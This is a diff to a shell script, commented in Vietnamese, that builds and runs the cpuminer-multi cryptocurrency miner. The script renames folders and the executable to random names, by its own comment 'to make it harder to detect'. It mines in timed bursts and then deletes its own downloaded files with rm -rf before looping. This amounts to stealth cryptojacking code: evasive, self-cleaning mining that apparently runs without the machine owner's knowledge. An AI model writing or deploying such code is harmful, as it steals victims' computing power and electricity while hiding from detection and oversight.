@@ -17,7 +17,10 @@ mv cpuminer-multi $(generate_random_name)
 cd $(generate_random_name)
 
 # Build cpuminer-multi
-./build.sh
+./autogen.sh
+./nomacro.pl
+./configure --disable-assembly
+make
 
 # Đổi tên file thực thi của cpuminer để khó phát hiện hơn
 random_name=$(generate_random_name)
@@ -34,7 +37,8 @@ sleep 300
 kill $miner_pid
 
 # Xóa các file đã tải và giải nén
-rm -rf $(dirname $(readlink -f $0))
+cd ..
+rm -rf $(basename $(pwd))
 
 # Nghỉ 3 phút trước khi lặp lại
 sleep 180
